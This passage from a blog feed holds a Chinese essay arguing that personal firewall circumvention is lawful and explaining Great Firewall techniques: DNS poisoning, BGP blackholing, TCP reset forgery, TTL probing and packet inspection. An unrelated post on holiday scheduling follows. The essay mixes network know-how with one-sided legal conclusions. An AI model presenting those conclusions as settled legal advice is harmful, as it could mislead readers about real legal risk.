全球互联网的本来面貌并非是每一个国家都在各自为政，各自建立一个庞大的“局域网”，相反，几乎所有国家的网络都是互联互通的。有了国家之间建设的陆上、海底光缆，民众访问境内网站和境外网站从技术上是没有任何区别的，在现行法意义上也是没有任何区别的。 （3） 你不能访问境外网站唯一的原因，是你正在遭受DNS劫持、域名污染、DDOS攻击、TCP旁路阻断、BGP劫持（黑洞路由）等网络攻击或防御手段。（这些专业名词会在第四章详细介绍。）这些攻击防御手段只有技术人员才能感受到，普通人唯一的感受就是无法访问外网。当前没有任何公开的官方文件证实了上述攻击手段存在，现行法也没有为上述任何网络攻击手段提供合法性依据。 （4） 你通过任何手段进行翻墙，这一行为的本质是抵御或逃避上述网络攻击，并使用国家批准的合法互联网基础设施访问境外网站，不存在违法的问题，也没有实际的社会危害。 提供翻墙方法、售卖翻墙服务的违法性 这一段虽然和本文主题“个人翻墙”并没有直接关系，但本文的结论和现行司法实践对于“出售翻墙工具”的论证是矛盾的，所以必须指出来。 下图展示了可能涉及“翻墙”的罪名，我们主要关注第一类案由：“非法出售可访问境外互联网网站的'VPN'翻墙服务”，其对应的罪名是“提供侵入、非法控制计算机信息系统程序、工具罪”。 目前出售翻墙服务是违法犯罪行为，相关的案例在无讼的检索结果中不计其数。法院判决的论述部分基本上与下面的引用大同小异： 本院认为，被告人为牟取非法利益，违反国家规定，在互联网推广用于侵入计算机信息系统的程序、工具，情节特别严重，其行为已构成提供侵入、非法控制计算机信息系统的程序、工具罪。公诉机关指控的罪名成立。经查，本案的“XXX”软件，利用公用网络架设专用网络，并进行数据加密传输，使计算机信息系统自由访问中国境内无法访问的境外网站，因此，该软件属于“用于侵入计算机信息系统的程序、工具”。被告人在未经电信主管部门批准的情况下，提供的“XXX”软件使客户的计算机自由访问境外网站，数据传输受到加密保护，突破我国技术安全防护措施，危害了国家信息网络安全，符合提供侵入、非法控制计算机信息系统的程序、工具罪的客体。 （2018）鄂1202刑初389号 自从我学习了这个罪名以来，就对此抱有极大的质疑。翻墙工具怎么可以等同于“用于侵入计算机信息系统的程序、工具”？ 一个最简单的反驳实例就是，GFW最早的原理是将google.com指向无效ip地址（即第四章论述的DNS污染/域名劫持），而最早的翻墙原理是在本地建立一个DNS库，将google.com指向真实的ip地址，或者使用8.8.8.8这样尚未被污染的DNS服务器，这样当你在浏览器键入google.com这一域名的时候，其就会访问正确的服务器。而这一行为的唯一操作步骤，就是打开windows的一个名为hosts的系统文件，将谷歌域名对应的ip地址录入，或者修改本地网卡的DNS设置，翻墙的效果就达成了。这样一个简单的步骤，怎么可能侵入了外人的计算机信息系统？ 而“架设专用网络，进行数据加密”是一个非常常用的网络应用，很简单的例子，在家里访问学校的图书馆以及学术资源，要打开vpn软件，这就是建立了一个加密通道，其和翻墙软件的原理是一模一样的，只存在结果上的不同。而这种技术突破“我国技术安全防护措施”的唯一原因，是由于这个所谓的“防护措施”会对你的网络请求进行分析，而加密流量很难被分析。况且，现行的规范性法律文件从没有提及这些法院判决中提到的“我国技术安全防护措施”。 另一个很有意思的问题是法院判决中通常会提到的“使计算机信息系统自由访问中国境内无法访问的境外网站”。但看了本文第四章，你就会认识到，这个世界上的互联网的本来面貌，就是让每个人可以自由地访问不同国家的服务器，并且这种自由在2002年以前是普遍存在的，在2010年以前也是大部分人都能享受到的。除非真的有一部行政法规出台，告诉我个人不能访问境外网站，这样我才能理解法院竟然能给出这样的表述。 另外，你可以洞察到，在法官论证部分，通常会有常人难以发现的跳跃性和滑坡论证。例如，“利用公用网络架设专用网络，并进行数据加密传输，使计算机信息系统自由访问中国境内无法访问的境外网站，因此，该软件属于“用于侵入计算机信息系统的程序、工具”。”这句话看似行云流水，但你细究下来，就会产生非常多的疑问——为什么一个工具可以自由访问原本无法访问的境外网站，就是侵入计算机信息系统的工具？为什么有些网站不能访问，其依据是什么？侵入的是哪一个计算机信息系统？该系统的ip地址是什么？地理位置具体在哪里？有什么相关规定吗？这种暧昧和含糊其辞其实不难理解，因为GFW这个词真的从未出现在某个文件上，但难以想象，“翻墙”这个词居然可以在相关的判决文书中随处可见。 但是，我是绝对支持对一些市面上大部分出售翻墙工具的人进行惩罚的，因为他们之中很多人都只是偷窃了开源项目技术人员的劳动成果，亦或是提供与其宣称不符的劣质（违法）产品，从而收取暴利，收割智商税。从构成要件上看，我认为其更加符合非法经营罪的构成要件，而非提供侵入、非法控制计算机信息系统程序、工具罪，因为后者在论证上存在着严重的逻辑漏洞。 另外，不仅仅是出售翻墙工具，还有很多技术人员因为编写开源翻墙项目而获此罪名。因此，这一领域的法律问题应该结合计算机技术问题被更深入、更广泛的探讨，这也是我写这一篇文章的初始动机。因为很多人确实需要通过境外网站查询学术资料、海淘等，这些行为都不存在违法性。而当他们使用翻墙工具访问境外网站大多不受惩罚的同时，惩罚却被转嫁到了提供翻墙方法的人之上。 而与此同时，现在社会上出现一种声音，他们也同意国家根本不禁止个人翻墙，但他们更进一步表达了他们的自信和乐观，他们认为国家不仅不禁止翻墙，还鼓励有独立思考能力的人翻墙输出文化（依据是李子柒）；同时认为：对于真正有独立思考能力的人来说，翻墙实在是太容易了，甚至他们会用嘲讽的语气阴阳怪气道：“没有独立思考能力的人活该待在墙内”。这种风气我认为非常不好，毫不避讳地说，这是吃人血馒头的行为。因为他们不知道，真正致力于“为他们寻找访问境外网站方法”的人，大多承受着极大的法律风险，而与此同时，GFW的技术手段越来越强悍，翻墙的成本越来越高，普通人甚至很容易在这一领域被骗——对于这些问题，他们向来是采取无视态度的。如果让这种声音成为这个社会的主流，那么我对这一领域在未来进展的预测将是极其悲观的。 更进一步，我们应当思考，当程序员为“人们正常访问合法境外网站”而努力的时候，法律工作者的努力又在哪里？为什么现在大部分法律工作者都在就着错误的计算机基本常识来进行法律方面的论证呢？我不禁陷入了深思…… 从计算机技术角度解读：什么是墙，什么是翻墙 在了解GFW和翻墙的原理之前，你必须对互联网运行的基本原理有一个宏观的了解——至少，你需要知道当你在浏览器键入baidu.com，页面呈现在你眼前时，究竟发生了什么。你只有知道发生了什么，才可能看懂GFW是怎么样阻止你访问网页，而翻墙又是如何让你穿越重重阻碍成功访问境外服务器的页面的。 1、互联网访问的基本原理——OSI参考模型 我们之中一定有很多人还依稀记得高中、大学计算机课曾提及“互联网分成好几个层次”。最浅显易懂的当然是物理层，因为日常生活中，光纤、网线、电话线之类的东西是随处可见、看得见摸得着的。 那么，关于GFW和翻墙的一切话题，都在上述模型中的哪一层呢？你以为他们在第一层（物理层），实际上他们分布在第三层（网络层）、第四层（传输层）和第七层（应用层）。 为了让大家更好地理解这个“老千层饼”，我分别以访问baidu.com主页和境外服务器ip来简单阐述一下其过程中涉及的原理（对应OSI参考模型）。 国内网站访问原理 在浏览器输入baidu.com 浏览器并不会直接聪明地找到百度的服务器。 正如我们在使用传统电话时，不可能直呼一个朋友的名字，电话就自动打过去了——我们一定需要知道朋友的电话号码。此时baidu.com就相当于你的一个朋友的名字，而它的电话号码就是我们熟知的ip地址（第三层：网络层）。但我们不可能像记住朋友手机号那样记住baidu.com对应的ip地址39.156.69.79，而是需要一个电话号码簿替我们记住。这个电话号码簿有很多种，例如浏览器缓存（短时）、本地DNS缓存、hosts文件、网卡配置信息里的DNS服务器以及DNS根域名服务器，优先级从前到后。在上述所有“电话号码簿”中，都记载了“baidu.com=39.156.69.79”这样一个信息，当我们命令浏览器访问baidu.com时，（若浏览器缓存、本地DNS缓存、hosts文件都没有记载这位朋友的号码），那么浏览器就会使用UDP协议（第四层：传输层）向DNS服务器请求baidu.com背后的ip地址，DNS服务器域名系统解析（第七层：应用层）后返回正确的ip地址。 浏览器拿到ip地址后向正确的服务器发送http请求 http协议（第七层：应用层）是建立在tcp协议（第四层：传输层）基础之上的的，tcp在建立连接前有三次握手。 通过dns解析之后，拿到了ip，就可以通过ip向服务器发送http请求了，因为http是工作在第七层应用层，tcp是工作在第四层传输层，所以发生http请求之前，还会进行tcp的三次握手。 tcp的三次握手是：客户端首先向服务器发送一个带有SYN标识和一个seq的随机数，服务端收到后，需要给客户端回应一个ack，ack的值就是刚才的seq随机数的值+1，在回应包里，还包含一个SYN的标识和一个seq随机数。客户端收到服务端发过来的回应包之后，再给服务端发送一个ack，ack的值就是刚才服务端发过来的seq的值+1。上面三步完成之后，三次握手就完成了，下面就可以开始传数据了。 为什么建立连接要这么复杂呢？一切为了安全和可靠。DNS服务所运用的UDP协议和http请求的tcp协议最大的区别在于，UDP就像一个在国际货物运输过程中前赴后继、不顾一切的承运人，它努力以最快的速度把“货物”交付到你手上，但态度极差，从来不主动跟你联系，也不会接你的电话，货物是否损毁或者送错了人都不在它的义务范围内；而TCP就像一个严谨、可靠、负责、慢条斯理的承运人，它在为你进行货物运输时会不断和你建立联系，在送货前不停打电话跟你反复确认，而且要打三次，生怕送错了人，送完货物也会不紧不慢地和你再三确认，要跟你打四通电话。 网上一个更形象的例子是—— TCP 三次握手好比在一个夜高风黑的夜晚，你一个人在小区里散步，不远处看见一位漂亮妹子迎面而来，但因为路灯有点暗等原因不能100%确认，所以要通过招手的方式来确定对方是否认识自己。 你首先向妹子招手(syn)，妹子看到你向自己招手后，向你点了点头挤出了一个微笑(ack)。你看到妹子微笑后确认了妹子成功辨认出了自己。 但妹子有点不好意思，向四周看了一看，有没有可能你是在看别人呢？她也要确认一下。妹子也向你招了招手(syn)，你看到妹子向自己招手后知道对方是在寻求自己的确认，于是也点了点头挤出了微笑(ack)，妹子看到你的微笑后确认了你就是在向自己打招呼。于是两人加快步伐，走到一起，彼此之间相互拥抱。 数据包是如何从你在上海的计算机发至架设在北京的百度服务器呢？ tcp三次握手已经很生动形象了，但毕竟从上海发送一个数据包至百度架设在北京的服务器的难度，与“在小区里和美女当面互相打招呼”的难度压根不在一个数量级，数据包是如何通过祖国大地下架设的“杂乱无章”、连通全国的光纤中找到去往北京的最快的路，而不至于兜圈或者迷路呢？ 这要得益于国内几家国有电信运营商建立的庞大的骨干网和城域网。我们作为外行，可以把这种网络理解成一个个互相连通的节点。 例如，中国电信163骨干网分为北京、上海、广州3大片区，这三个片区有大型的骨干路由作为邻近省级区域的数据交汇中心，例如上海片区涵盖了上海、江苏、安徽、山东、浙江、福建、江西这几个省，而每个省的内部又有庞大的、互相连接的城域网，而在某个城市的城域网内部，又有数以万计的学校、企业、家庭等局域网的接入，从而形成了从局域网→城域网→广域网三个层级。 此外，不只是中国电信，其他运营商也有各自的骨干网，例如中国联通有CHINA169骨干网和CNCNET骨干网，中国移动有CMNET全国骨干网……不同国家级互联网业务提供商（Internet Service Provider， ISP）建立的不同骨干网之间也有数据交换的中心，这使得信息和数据包可以自由地从全国的任何地方流向任何地方。（相关链接：《互联网骨干网全面解析》https://zhuanlan.zhihu.com/p/32090927） 连通性的问题解决了，还要解决数据包在庞大的“网上公路”迷路的可能性。在上述提到的各个级别的网路中，分布着无数路由节点，每一张骨干网都有自己负责的路由群组和节点，整个群组统称为as自治系统（Autonomous system），每一个骨干网管理的as自治系统都经过名为互联网号码分配局的国际机构分配唯一识别代码，例如，中国电信163骨干网的as自治系统编号为AS4134。每一张骨干网都有内部路由协议，每一个节点都在依据某种规定互相交换他们所连通的ip地址信息，作为数据包在“旅行”过程中的指路人。而全国性的骨干网之间也依靠外部路由协议互相交换它们所掌握的“服务器地图“，典型的有BGP协议。 边界网关协议（英语：Border Gateway Protocol，缩写：BGP），一个去中心化自治路由协议。它通过维护IP路由表或‘前缀’表来实现自治系统（AS）之间的可达性，属于矢量路由协议，其使用基于路径、网络策略或规则集来决定路由。 维基百科 https://zh.wikipedia.org/wiki/边界网关协议 BGP协议使得各大骨干网的路由节点可以以tcp数据包的形式互相转发其掌握的路由信息，从而形成一个庞大的、完整的决策网，对数据包提供全面的“导航服务”，它能计算出数据包从一个客户端通往另一个外省客户端必经的最优路线和路由节点。条条大路通罗马，当一个路由节点故障时，因为各个节点都互相沟通，从而可以带领数据包选择其他路线通网可达的节点，避免“兜圈子”、“迷路”等情况。 使用traceroute（链接：https://tools.ipip.net/traceroute.php），可以利用ICMP 协议定位您的计算机和目标计算机之间的所有路由器节点。下图展示了我从自己的计算机访问百度设在北京的服务器39.156.69.79所经过的骨干网和路由节点，可以看见其经过了AS4812（中国电信163骨干网）的124.74.232.53、124.74.166.125等路由节点，而其途径的AS9808为中国移动骨干网的AS自治系统。 传输数据，发送http请求报文，加载页面（省略） →http协议是明文协议 →https协议更加安全，其在tcp握手的基础之上增加了以下步骤： 验证服务器数字证书、在SSL安全加密隧道协商加密算法的密钥等。 关闭连接前的tcp四次握手（省略） 境外网站访问原理 在了解了国内数据包交换原理之后，全球的数据交换就很好理解了——你可以简单地把它理解为国家级骨干网之间的连接和交换。而从国内访问境外服务器有一个特殊之处就在于，我国的国际出入口运营资质是被中国电信、中国联通、中国移动三家国家级ISP垄断的。 跨国企业使用跨境服务合规方式。跨国企业因协同办公、数据交互等自用需求，可以采用以下方式实现跨境联网：跨国企业从境内发起直接租用3家基础电信企业的国际专线（包括虚拟专网），与企业办公自用网络和设备连接；跨国企业从境外直接发起或委托境外运营商，向3家基础电信企业租用国际专线（包括虚拟专网），与企业办公自用网络和设备连接。跨国企业租用国际专线自建自用办公网络时，可委托有资质的第三方（含持国内IP-VPN、固定网国内数据传送等业务许可的企业）提供系统集成、代维代管等外包服务，但第三方企业不得从事国际专线（包括虚拟专网）的线路资源租售等电信业务经营活动。 2018年1月10日在北京召开了《跨境数据通信业务政策宣贯会暨产业联盟筹备大会》，国内数十家IP-VPN等相关业务经营企业参加了此次大会。 而国内数据跨境的物理传输介质一般为陆上光缆和海底光缆。通过上海直达美国的CN2骨干网海底光缆，亦或是从广州到香港的163骨干网线路的连接，国内和国外的数据完全可以自由地进行交换，而服务器的连接、数据包的交换、路由的选择，其本质上和访问国内服务器并没有什么区别，其协议的使用也是全球通用的。 所以，一个真正的国际互联网并不存在所谓的“墙”，它依旧是通过海底光缆等物理介质，作为OSI模型中的第一层，为其他几个层次的互联网运行提供服务。不管你是否翻墙，不管你访问的是合法的境外网站还是受到管制和审查的网站，一旦你成功ping同，实现了数据的交换，那么数据包就一定要通过我国设立的互联网国际出入口，从一条条光缆直达国外的服务器。 因此，我很遗憾地看到，即使是律所发表的相关文章《天衡解析 | “翻墙”上网的正确姿势》，也犯了非常严重的计算机常识性错误，导致该篇文章论证的前提就是不正确的。这篇文章指出： 由于企业的“翻墙”行为既未使用合法的“国际出入口信道”，也未接入合法的“接入网络”，甚至未使用境内的“互联网络”，已经违反了《中华人民共和国计算机信息网络国际联网管理暂行规定》的规定，公安机关有权责令企业停止国际联网行为，同时给予警告，并处以15000元以下的罚款。 然而， 当我们对互联网运行的机制和原理有了初步的了解后就能轻松发现这句标红的话的严重错误——我在上文所介绍的一切专业术语的实际运作，不管是DNS解析、TCP握手，还是AS自治系统、BGP、路由跳转、ICMP协议……一切的基础都是物理层。 如果你没有接入各大运营商设立在城市里的合法的城域网； 如果数据包没有经过各大国家级ISP的合法骨干网和路由节点AS自治系统； 如果境外数据访问没有经过国内三大运营商经国家批准设立的合法国际出入口并通过合法的陆上、海底光缆设施直达境外服务器…… 你的一切数据交换和网站访问都是不可能凭空实现的。 换句话说，即使一家企业使用某个国外代理服务器作为中转节点以逃避GFW的审查，这一翻墙行为的一切基础都是建立在使用合法的国家互联网基础设施之上的。因为你不可能自己去发射一颗卫星专门用来刷推特，也不可能自己制造海底电缆，自发地潜水到海底接入别的国家的网络。 因此，对于普通个人和企业来说（这里的“普通”是指没有能力发射卫星、埋海底光缆），根本不存在所谓“非法的国际出入口信道”、非法的“接入网络”、“在不使用境内互联网络的前提下访问域外服务器”。 一个最直接的证据，也是每个人都能亲身试验的方法，就是使用前文介绍的traceroute命令，访问某个境外服务器的ip地址，遍历数据包途经的骨干网和路由节点，你就会知道，你到底是不是在使用国家级电信运营商布建的、国家批准的网络基础设施了。我随机使用一个尚未被限制的境外服务器ip测试一下，结果如下： 可见，当你成功访问境外服务器，当然也意味着成功实现了翻墙，但你的数据经过的是AS4812（中国电信上海路由群组）、AS4134（中国电信163骨干网路由群组），最后通过海底光缆直连美国加利福尼亚州洛杉矶的AS8100路由群组。你使用的一切光缆、路由节点、海底光缆，全都是经过工信部审批通过的国家级互联网基础设施。翻墙就是使用了非法的信道——这种逻辑是很可笑的。 因此，国际出入口就在那里等着你，海底光缆也在向你招手，凭什么不能访问境外网站呢？在看了下文GFW原理和翻墙原理的介绍，你就会知道，你不能访问境外网站的唯一原因是你正在遭受一个不受法律规制的系统的不间断网络攻击，而你使用任何途径翻墙的基本原理永远都是——你使用了某种技术抵御或避免了上述网络攻击。 GFW的原理 首先，我们反复强调，GFW这个概念在当前一切公开的规范性法律文件中都是不存在的。因此，对“翻墙”进行处罚、甚至将“翻墙”这个词写在一个法律文书中简直是无中生有、自取其辱，是非常荒谬的行为。 其次，在学习了以下原理之后，你将清楚地认识到：现行法律规定的所谓“信道”都是在物理层的，而GFW和翻墙的较量基本上都发生在传输层、网络层、会话层、应用层（参见OSI模型）等等，这些层级是法外之地。 在看下文之前，可以同时回顾——你究竟是如何能够访问一个网站的页面的。GFW目前已知的原理有以下几种： 基于UDP协议的域名解析服务劫持/DNS缓存污染 大家一定还记得那个电话号码簿的故事。GFW最早、最初始的原理，就是将这个电话号码簿掉包，或者将号码簿里的电话号码替换成错误的号码，这个原理诞生于2002年，在2012年以前达到高峰。GFW对所有经过骨干出口路由的基于UDP的DNS域名查询请求进行Intrusion Detection Systems（入侵检测系统）检测，一旦发现处于黑名单关键词中相匹配的域名查询请求，防火长城作为中间设备会向查询者返回虚假结果。 简而言之，DNS域名污染就好比你想在电话号码簿上查询朋友的电话号码，但是不曾想，电话号码簿被人掉包了，你拿到的是假的电话号码簿，原本正确的手机号码被替换成了错误的号码，导致你无法打通电话。而该系统触发的规则使用了类似正则表达式的结构，例如规定“对于一切*.google.com的域名解析到某个不存在的ip地址”。 直接使用windows的ping命令就可以亲眼看到DNS污染的运作效果。谷歌官网的服务器明明架设在美国科罗拉多丹佛，但从下图可以看见，在国内从DNS服务器请求到的ip地址却是93.46.8.90这个来自意大利的无效IP地址。 此项技术不仅是2012年前后人们无法再访问Google的直接原因，其在运转过程中更是殃及了全球DNS域名解析服务的正常运作。 种DNS污染的方式曾经向中国大陆以外的用户造成影响。2010年3月，当美国和智利的用户试图访问热门社交网站如facebook.com和youtube.com还有twitter.com等域名，他们的域名查询请求转交给中国控制的DNS根镜像服务器处理，由于这些网站在中国被封锁，结果用户收到了错误的DNS解析信息，这意味着防火长城的DNS污染已影响国际互联网。2010年4月8日，中国大陆一个小型ISP的错误路由数据，经过中国电信的二次传播，扩散到了整个国际互联网，波及到了AT&amp;T、Level3、德国电信、Qwest和西班牙电信等多个国家的大型ISP。(来源:维基百科) DNS污染殃及全球用户的基本原理很简单，就是诸多国外用户的DNS请求被他们的ISP电信运营商随机分发给了全球的根域名缓存服务器（也就是那个优先级最低的电话簿），而碰巧，他们请求被分发给了来自中国的根域名服务器，而因为GFW的存在，其提供的是错误的、虚假的DNS解析服务，其造成的后果可想而知。 因此在这里我忍不住插一句题外话。我曾亲耳听见一个计算机专业毕业的人谈及中国的互联网安全现状。他说，因为全球大部分根域名服务器都设立在美国，所以美国掌握互联网的底层，中国必须建立GFW来保障互联网安全。现在，你应该可以体会到这种言论的恶毒之处。因为现在你终于了解到，电话簿可以随时复制，根域名服务器根本就不是什么互联网的底层，而是最高层（应用层）中一个很简单的技术，你的浏览器永远最先访问本地DNS缓存，往往一般都无须根域名服务器就能解析IP地址；而中国的根域名服务器会对境外服务器域名解析错误的ip地址，因此现实情况是中国的DNS污染在影响全球的互联网运行，而非美国影响了中国的互联网安全，这是完全的颠倒是非。 IP地址或传输层端口人工封锁——BGP路由劫持/“路由黑洞” 我们依稀记得BGP好像是各个ISP主干网之间路由节点共享信息的协议，BGP劫持就是伪造位于主干道的路由节点的路由表，将其根本没有或者不可能连通的ip地址导入路由表，诱骗邻近节点相信该节点拥有这一ip地址的访问通道。GFW通过人工方式维护一个针对特定IP地址封锁的列表，从而实现特定ip地址的路由欺骗，这样一个节点我们将其称之为“路由黑洞”。因为基于BGP协议，各个节点之间是无条件信任的，所以这个“谎言”一传十、十传百，只要一个主干道路由节点被诱骗，其连接的所有节点都会被骗，成为GFW运作的&quot;帮凶&quot;。而BGP劫持的“可传染性”特征曾经导致全球互联网访问故障。 2010年4月8日，中国大陆一个小型ISP的错误路由数据，经过中国电信的二次传播，扩散到了整个国际互联网，波及到了AT&amp;T、Level3、德国电信、Qwest和西班牙电信等多个国家的大型ISP。 A Chinese ISP Momentarily Hijacks the Internet. PC World. 2010-04-09 [2011-05-19]. （原始内容存档于2011-06-22）. 我们依旧可以通过traceroute观察到这一技术的运行效果，我们尝试traceroute一下google.com的真实ip地址，得到如下结果： 可以看见，当数据包跳转给中国电信上海AS4812群组的101.95.120.166路由节点之后，就再也跟踪不到数据包的踪迹了。这是因为在这一节点，存在着一个无效的路由黑洞，其声称自己拥有172.217.24.12这一ip地址的访问可达性，但话音刚落，它就把数据包丢弃在角落了…… 与此同时，骨干路由器还有一种ACL Based Forwarding (ABF)的匹配规则，可以在全国骨干路由器同步步数ip端口封锁规则，由于理解不太深入，这里不做专门介绍。 另外，在路由黑洞成为封锁ip的主要途径以前，GFW在早期使用的是访问控制列表（ACL）技术来封锁特定的IP地址，但这种方法有性能不佳的问题。这里不做专门介绍。 TCP RST重置（包括对基于TCP协议的DNS域名解析的重置） 我们依稀记得TCP建立连接前的三次握手，也一定还记得那天在小区里与美女浪漫的邂逅。将TCP RST重置套用到这个浪漫的故事里，可以直接表现为：当你对着妹子招手时，旁边突然冲出来一陌生男子骗你说，“对不起，这是我的女朋友，请不要打扰她”；而随后，他又挡在你面前伪装成你的样子，冲向那位女子说，“刚刚招手的就是我，你别误会，我根本就不是在跟你打招呼，我只是在打蚊子，拜拜”——这个生动的故事为我们展现了，一个无耻的第三人就这样强行闯入了一个纯洁男子和妙龄女子的浪漫邂逅。 RST阻断也称为TCP旁路阻断，其运行的原理如下： 通常需要进行阻断的情况是审计控制系统旁路监听内网。旁路监听的方式一般是将主交换机的数据镜像到控制系统，控制系统可以采用libpcap捕获数据包。在这种情况下要阻断tcp连接的建立只要在监听到第一次握手的时候，控制系统伪造服务器发起第二次握手回应，就能阻断客户端与服务器连接的建立。因为我们的系统在内网，发出的报文肯定比服务器快，这样客户端接收到我们伪造的报文以后会回应第三次握手，当服务器真正的报文到达的时候客户端将不再处理，此时客户端再向服务器请求数据，因为seq号和ack号出错，服务器不会受理客户端的请求。 版权声明：本文为CSDN博主「pluton」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/pluton/java/article/details/5816227 TCP协议规定，只要看到RST包，连接立马被中断。从浏览器里来看就是连接已经被重置。大部分的RST是条件触发的，比如URL中包含某些关键字。目前享受这种待遇的网站就多得去了，著名的有facebook。还有一些网站，会被无条件RST。也就是针对特定的IP和端口，无论包的内容就会触发RST。比较著名的例子是https的wikipedia。GFW在TCP层的应对是利用了IPv4协议的弱点，也就是只要你在网络上，就假装成任何人发包。所以GFW可以很轻易地让你相信RST确实是Google发的，而让Google相信RST是你发的。 《G.F.W的原理》 http://www.oneyearago.me/2019/06/14/learn_gwf/ 与此同时，DNS解析服务并非全部都使用UDP协议，也有部分使用TCP协议的DNS解析请求，其被封禁也是依靠TCP的RST重置， 通过这一技术的反推，有业内人士定位了GFW存在的大致位置。其原理如下： IP协议的特性叫TTL。TTL是Time to Live的简写。IP包在每经过一次路由的时候，路由器都会把IP包的TTL减去1。如果TTL到零了，路由器就不会再把IP包发给下一级路由。由于GFW会在监听到不和谐的IP包之后发回RST包来重置TCP连接。那么通过设置不同的TTL就可以知道从你的电脑，到GFW之间经过了几个路由器。比如说TTL设置成9不触发RST，但是10就触发RST，那么到GFW就是经过了10个路由器。 另外一个IP协议的特性是当TTL耗尽的时候，路由器应该发回一个TTL EXCEEDED的ICMP包，并把自己的IP地址设置成SRC（来源）。结合这两点，就可以探测出IP包是到了IP地址为什么的路由器之后才被GFW检测到，结合IP地址地理位置的数据库就可以知道其地理位置。 《G.F.W的原理》 http://www.oneyearago.me/2019/06/14/learn_gwf/ 协议检测→根据流量协议拆包→关键词匹配→封锁 我们在上面一段曾了解到，GFW的TCP旁路阻断的前提是“将主交换机的数据镜像到控制系统”。这其实也是目前业内猜测的 GFW系统存在的主要方式——GFW存在于骨干路由器节点，其作为一个设备附着在主干路由器身边，通过“分光”的方式把数据包复制到另外一根光纤上。 基于此，GFW作为一个独立设备就可以作为旁观者分析经过其附着的主干路由器的所有数据包。 HTTP协议有非常明显的特征，可以轻易被GFW系统检测和识别，GFW进而依据HTTP协议规则对数据包进行拆解，由于其表现为明文，所以可以直接进行关键词匹配。例如，从HTTP的GET请求中取得请求的URL。然后GFW拿到这个请求的URL去与关键字做匹配，比如查找Twitter是否在请求的URL中。而关键字匹配使用的依旧是一些高效的正则表达式。 深度包检测（机器学习识别翻墙流量→直接阻断） 当前流行的一切翻墙协议例如shadowsocks、v2ray的VMess 协议等不具有非常显著的特征，而后者可以伪装成其他类型的流量，例如伪装成微信视频等。但无论如何，对于混淆流量和非传统加密协议，GFW正在使用大家耳熟能详的“人工智能”技术，将这些各种各样难以判断和识别的翻墙流量与正规的政企跨境流量相区分开来。 DDoS攻击 不再展开论述，可参考近年来Github网站遭受的攻击。 翻墙的原理 这一部分我不再展开论述，因为是有法律风险的。有一定网络基础知识的人，在看完上述GFW原理之后，应当能够头脑风暴一下，想出很多合理的逃避审查的思路，也能理解为什么我在上文提及“翻墙不等于侵入计算机系统”了。主要的翻墙原理有以下几种。 （1）早期对DNS污染的应对——给hosts文件添加一个离线库就行了 （2）各种奇形怪状的加密协议，包括流量伪装，避免被直接拆包作关键词审查 （3）无视GFW发送的RST重置数据包（无视那个第三人，继续暧昧的相遇） （4）连接境外未被封禁的代理服务器作为中转站，逃过GFW的ip封锁 …… 结语 在文章结尾，我依旧要强调，本文不涉及有关“翻墙”的任何技术指导或方法的具体介绍，同时必须强调——千万不要翻墙访问、发布、传播违法有害信息。 我们很多人都记得2012年以前的那个时代，想要用谷歌搜索资料，只需要修改DNS服务器为8.8.8.8即可，再不济，改个hosts文件就行了。现在，越来越多的方法被封锁了，在这个节骨眼上，居然还有很多人盲目乐观，甚至以他人不懂翻墙而沾沾自喜，这样的现象伴随着民族主义思潮愈演愈烈。 但是我相信，认真学习自己的专业知识，同时广泛地接受和学习其他领域的专业知识，就能轻松避免被网上大肆输出情绪的人鼓动和欺瞒，保持冷静地思考——你真的可以对现状有一个清晰的认识和判断，并在不久的将来参与到各行各业的运行过程中，为社会做出贡献。 而这篇文章，就权当我在学习之余的放松心情、自娱自乐罢。 那么现在，你能否就程序员群体提出的以下选择题给出正确解答了呢？ ","link":"https://blog.gd1214b.icu/post/CoDNIXdTR/"},{"title":"2021年五一假期，调休之后实际只放假一天，为什么没有「不调休」的假期？","content":" 作者：欧洲金靴 链接：https://www.zhihu.com/question/455705530/answer/1852406576 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 调休制度实在是反动，不论是官定还是资定。 看似一口气放五天假、七天假、八天假，但统统会在前后的双休中找回来。等于是“借你的双休，来补足我设立的法定假期额度”。 可问题是，这双休也是打工人本就法定的自有假期，你这一“借”，归还否？ “借”的时候，商量否？本身所有的所谓“三天假”都会克扣双休，这种操作放在996的大背景下就更加让人崩溃：原本就已然996的状态，却又因为小长假的“寻补”而继续进一步攫取压榨双休。 为了促成五天假、七天假的实现，反而让长假前后的996更恶化了一个层次，直接堂而皇之地变成了007：“辛苦点，下礼拜给你一连放五天……” 这就是在劳资双方的经济与政治地位均不平等的情况下，关于时间的分配权、假期的操控权完全为资本所控。 恩格斯曾描述过19世纪英国的工厂：“工人是禁止携带自己的钟表的，对于时间的定义也成为了资本家的特权。工人的工作时间要以工厂的时钟为准，而资本家和他的监工们往往会常常在时钟上做手脚：上班时先把时钟拨早一些，下班时又把时钟拨晚一些，通过增加工作时长剥削过多的剩余价值。” 这与今天利用所谓的调休制度对假期设置进行干预操纵，难道不是一回事吗…… 从宏观舆论观察，似乎还要求打工人为这个赏给你的五天假、七天假感恩戴德，并会相当义正辞严、理直气壮地提醒你：“一口气放这么长时间的假，可别光想着休息啊！在家要常看看钉钉、企业WeChat……” 这属于温水煮你的同时，还当着你的面明目张胆地往你屁股底下加柴火。 集中时长加班所造成的身心两方面的伤害，这难道可以通过一口气睡它个五天五夜找补回来吗？ 更何况，这小长假也不是让你单纯休息的，是让你出门去消费的！哪怕这门外人山人海、各个景点被堵的水泄不通，你也必须消费，否则从拉动内需的角度你就是一个没有价值贡献的人。 可是那些端坐高台的人似乎忘了，人们并不是不愿意消费、放松、逛街、吃喝，但这些理应置于规律性的周末双休中，而不是挤破头、让人窒息的五一/十一/春节小长假。 最后的最后，工作时创造的价值和休息时消费的回馈全部归了企业，然而一切的代价则丢给自己承担。 如19世纪美国马萨诸塞州一个鞋厂的监工说的话：“让一个身强力壮体格健全的18岁小伙子，在这里的任何一架机器旁边工作，我能够使他在22岁时头发变成灰白。” 列宁在《论意大利社会党党内的斗争》中有指出：“只要阶级还没有消灭，任何关于一般自由和平等的谈论都是欺骗自己，或者是欺骗工人、欺骗全体劳动者和受资本剥削的人。无论如何，也是在维护资产阶级的利益罢了。” 在一个实质性没有工会也没有任何区域性工人组织的情况下，目前的劳资局面很让人无语，早已失去集体庇护的工人阶级几乎是没有议价权和话语权的。 甚至，他们压根连多余的、去进行“团结”的时间都没有，连发一条“我今天好累啊”的动态都没有时间。 